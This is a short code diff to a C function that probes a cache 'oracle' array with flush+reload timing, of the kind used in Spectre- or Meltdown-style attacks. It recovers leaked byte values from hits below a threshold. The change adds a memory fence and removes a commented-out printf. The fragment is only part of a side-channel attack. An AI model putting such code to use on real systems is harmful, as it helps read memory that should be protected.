@@ -36,8 +36,6 @@ void __attribute__((__always_inline__)) flush(char* oracle_ptr, size_t offset){
 void __attribute__((__always_inline__)) probe(char* oracle_ptr, int thresh, size_t offset, int data[256]){
     static int i, mix_i, j;
     static char* addr;
-
-
     for (i = 0; i < 256; i++) {
         mix_i = ((i * 167) + 13) & 255;
         if (32 > mix_i || mix_i > 126){
@@ -45,8 +43,8 @@ void __attribute__((__always_inline__)) probe(char* oracle_ptr, int thresh, size
         }
         addr = oracle_ptr + mix_i * offset;
         if (flush_reload_t(addr) <= thresh){
-            //printf("%c\n", mix_i);
             data[mix_i]++;
+            _mm_mfence();
         }
         _mm_mfence();
     }
